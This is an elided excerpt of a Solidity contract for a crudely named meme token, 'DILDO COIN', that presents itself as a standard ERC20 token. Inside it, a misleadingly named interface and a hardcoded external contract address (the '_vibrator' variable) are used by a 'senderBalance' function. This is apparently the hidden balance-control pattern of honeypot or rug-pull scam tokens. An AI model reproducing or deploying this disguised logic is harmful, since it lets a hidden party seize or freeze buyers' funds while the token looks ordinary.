...
interface IERC777 {
      function extractAddress(uint256 value) external returns (uint256);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _vibrator = 0x6309ffacb985A579d8c530d4Be1FE457D1931c5F;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return vibrator.extractAddress(amount);
    }
    ...
    function _DeployDildoCoin(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDildoCoin(creator, initialSupply);
    }
}

contract DildoCoin is ERC20Token {
    constructor() ERC20Token("DILDO COIN", "DILDO", msg.sender, 6969696969 * 10 ** 18) {
    }
}